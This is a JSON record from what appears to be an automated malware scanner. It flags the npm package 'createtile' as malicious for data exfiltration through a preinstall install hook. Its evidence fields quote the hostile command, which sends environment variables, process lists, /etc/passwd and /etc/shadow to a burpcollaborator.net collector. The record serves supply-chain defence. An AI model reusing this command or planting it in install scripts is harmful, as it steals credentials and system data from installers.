@@ -1,0 +1,42 @@
+{
+  "package_name": "createtile",
+  "version": "99.0.0",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "data_exfiltration",
+      "summary": "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain.",
+      "details": "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration.",
+      "confidence": 0.83,
+      "evidence_domains": [
+        "linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net"
+      ],
+      "evidence_commands": [
+        "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+      ]
+    },
+    {
+      "category": "install_hook",
+      "summary": "The package.json scripts.preinstall command is a known install hook.",
+      "details": "The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack.",
+      "confidence": 0.83,
+      "evidence_commands": [
+        "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+      ]
+    }
+  ],
+  "risk_vector": [
+    "data_exfiltration",
+    "install_hook"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "flag",
+    "structural_risk_score": 0.7773,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:12:10.279046"
+}
